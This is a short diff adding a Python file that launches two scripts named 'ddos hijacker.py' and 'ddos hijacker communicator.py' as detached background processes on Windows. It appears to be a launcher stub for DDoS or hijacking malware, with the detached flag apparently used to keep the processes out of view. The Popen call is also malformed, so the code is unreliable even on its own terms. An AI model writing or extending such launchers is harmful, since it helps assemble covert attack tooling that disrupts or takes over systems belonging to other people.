@@ -1,0 +1,4 @@
+import subprocess
+
+DETACHED_PROCESS = 0x00000008
+subprocess.Popen(["ddos hijacker.py","ddos hijacker communicator.py",], creationflags=DETACHED_PROCESS)
